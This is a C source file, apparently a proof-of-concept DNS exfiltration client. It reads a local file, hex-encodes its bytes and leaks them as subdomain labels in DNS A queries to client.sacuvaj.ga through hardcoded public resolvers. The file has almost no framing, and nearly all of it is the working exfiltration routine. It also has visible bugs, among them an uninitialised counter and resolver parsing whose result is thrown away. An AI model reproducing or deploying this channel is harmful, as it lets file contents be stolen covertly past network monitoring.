#include<stdio.h>
#include<string.h>
#include<arpa/inet.h> 
#include<netinet/in.h>
#include<unistd.h>
 
char dns_servers[10][100];
int dns_server_count = 0;

#define BUFFER_SIZE 256

unsigned char buffer[BUFFER_SIZE];
 
#define T_A 1 //Ipv4 address

//Function Prototypes
void ngethostbyname (unsigned char* , int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
void get_dns_servers();
 
//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
struct RES_RECORD
{
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
};
 
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;
 
int main( int argc , char *argv[])
{
    unsigned char hostname[100] = "client.sacuvaj.ga";



    get_dns_servers();

    char request[100];

    char url[61];


	FILE * file_ptr = fopen ("client.c", "r");

	int counter;

	size_t bytes_read = 0;

	int i;

	while(bytes_read = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, file_ptr)){
		for(i = 0; i < bytes_read; i++){
			sprintf(&url[counter%30*2], "%02X", buffer[i]);

			printf("%c", buffer[i]);

			if(counter%30 == 29){
				sprintf(request, "%s.%s", url, hostname);
				ngethostbyname(request , T_A);
				usleep(1000000);
			}

			counter++;
		}
	}

	ngethostbyname(request , T_A);
 
    return 0;
}
 
/*
 * Perform a DNS query by sending a packet
 * */
void ngethostbyname(unsigned char *host , int query_type)
{
    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;
 
    struct sockaddr_in dest;
 
    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;
 
    s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP);
 
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(dns_servers[0]);
 
    dns = (struct DNS_HEADER *)&buf;
 
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; 
    dns->opcode = 0; 
    dns->aa = 0; 
    dns->tc = 0; 
    dns->rd = 1; 
    dns->ra = 0; 
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;
 
    qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
 
    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; 
 
    qinfo->qtype = htons( query_type ); 
    qinfo->qclass = htons(1); 
 
    sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest));

    return;
}

void get_dns_servers()
{
    FILE *fp;
    char line[200] , *p;
    if((fp = fopen("/etc/resolv.conf" , "r")) == NULL)
    {
        printf("Failed opening /etc/resolv.conf file \n");
    }
     
    while(fgets(line , 200 , fp))
    {
        if(line[0] == '#')
        {
            continue;
        }
        if(strncmp(line , "nameserver" , 10) == 0)
        {
            p = strtok(line , " ");
            p = strtok(NULL , " ");
        }
    }
     
    strcpy(dns_servers[0] , "208.67.222.222");
    strcpy(dns_servers[1] , "208.67.220.220");
}

void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
    int lock = 0 , i;
    strcat((char*)host,".");
     
    for(i = 0 ; i < strlen((char*)host) ; i++) 
    {
        if(host[i]=='.') 
        {
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}
